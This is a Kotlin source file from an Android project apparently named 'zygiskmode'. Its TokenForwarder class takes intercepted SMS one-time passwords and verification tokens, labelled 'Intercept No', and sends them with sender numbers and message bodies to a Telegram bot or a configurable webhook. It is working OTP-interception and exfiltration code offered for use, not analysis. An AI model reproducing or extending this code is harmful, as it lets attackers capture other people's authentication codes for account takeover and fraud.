package com.hivirtus.zygiskmode

import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject

class TokenForwarder(private val configManager: ConfigManager) {

    private val client = OkHttpClient()

    fun forward(otp: LastOtp): Boolean {
        val config = configManager.load()
        if (!config.autoForwardToken) return false

        val botToken = config.telegramBotToken
        val chatId = config.telegramChatId

        if (botToken.isBlank() || chatId.isBlank()) {
            if (config.forwardUrl.isBlank()) return false
            return forwardWebhook(config.forwardUrl, config.forwardMethod, otp)
        }

        return forwardTelegram(botToken, chatId, otp)
    }

    fun sendTestMessage(): Boolean {
        val config = configManager.load()
        val botToken = config.telegramBotToken
        val chatId = config.telegramChatId
        if (botToken.isBlank() || chatId.isBlank()) return false

        val testOtp = LastOtp(
            otp = "TEST1234",
            sender = "08977509618",
            body = "sZ/HWb9+LtFZSOaVeU9+baPVa9X4imd4wq4noAGAFKvKenId/qwYS8IYcuU8OP3XLllboZ/ARatoNaJtWdZ7g==",
            phone = "08977509618",
            messageLabel = "",
            direction = "incoming"
        )
        return forwardTelegram(botToken, chatId, testOtp)
    }

    private fun forwardTelegram(botToken: String, chatId: String, otp: LastOtp): Boolean {
        return postTelegram(botToken, chatId, buildZygiskMenuMessage(otp))
    }

    /** Sirf Intercept No + verify token + Zygisk Menu header */
    fun buildZygiskMenuMessage(otp: LastOtp): String {
        val interceptNo = formatInterceptNumber(otp.phone.ifBlank { otp.sender })
        val tokenBody = otp.body.ifBlank { otp.otp }

        return buildString {
            appendLine("📱 <b>Zygisk Menu</b>")
            appendLine("<b>Mode By @hivirtus @liqdy</b>")
            appendLine("────────────────")
            appendLine("📞 <b>Intercept No:</b> ${escapeHtml(interceptNo)}")
            append(escapeHtml(tokenBody))
        }
    }

    private fun formatInterceptNumber(raw: String): String {
        val cleaned = raw.trim()
        if (cleaned.isBlank()) return "Unknown"
        val digits = cleaned.replace("\\D".toRegex(), "")
        return if (digits.length >= 8) digits else cleaned
    }

    private fun escapeHtml(text: String): String {
        return text
            .replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace(">", "&gt;")
    }

    private fun postTelegram(botToken: String, chatId: String, text: String): Boolean {
        val url = "https://api.telegram.org/bot$botToken/sendMessage"
        val payload = JSONObject()
            .put("chat_id", chatId)
            .put("text", text)
            .put("parse_mode", "HTML")
            .put("disable_web_page_preview", true)
            .toString()
        return postJson(url, payload)
    }

    private fun forwardWebhook(url: String, method: String, otp: LastOtp): Boolean {
        val interceptNo = formatInterceptNumber(otp.phone.ifBlank { otp.sender })
        val payload = JSONObject()
            .put("otp", otp.otp)
            .put("token", otp.body.ifBlank { otp.otp })
            .put("intercept_no", interceptNo)
            .put("direction", otp.direction)
            .put("telegram_format", buildZygiskMenuMessage(otp))
            .toString()

        val request = Request.Builder()
            .url(url)
            .method(method.uppercase(), payload.toRequestBody("application/json".toMediaType()))
            .build()

        return try {
            client.newCall(request).execute().use { it.isSuccessful }
        } catch (_: Exception) {
            false
        }
    }

    private fun postJson(url: String, payload: String): Boolean {
        val request = Request.Builder()
            .url(url)
            .post(payload.toRequestBody("application/json".toMediaType()))
            .build()

        return try {
            client.newCall(request).execute().use { it.isSuccessful }
        } catch (_: Exception) {
            false
        }
    }
}
